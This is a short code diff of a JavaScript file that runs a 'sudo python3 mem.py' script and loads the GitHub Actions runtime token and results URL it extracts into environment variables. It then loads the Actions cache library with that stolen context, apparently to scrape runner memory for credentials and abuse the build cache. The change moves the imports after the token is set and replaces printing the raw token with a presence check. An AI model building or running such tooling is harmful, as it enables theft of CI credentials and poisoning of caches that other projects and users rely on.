@@ -1,5 +1,4 @@
-import * as cache from '@actions/cache';
-import * as core from '@actions/core';
+
 import { execSync } from 'child_process';
 
 const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
@@ -10,8 +9,11 @@ process.env.ACTIONS_RUNTIME_TOKEN = token;
 process.env.ACTIONS_RESULTS_URL = url;
 process.env.ACTIONS_CACHE_SERVICE_V2 = true;
 
+console.log(process.env.ACTIONS_CACHE_SERVICE_V2, process.env.ACTIONS_RESULTS_URL, !!process.env.ACTIONS_RUNTIME_TOKEN);
 
-console.log(process.env.ACTIONS_RUNTIME_TOKEN)
+import * as cache from '@actions/cache';
+import * as core from '@actions/core';
+
 
 async function run() {
   try {
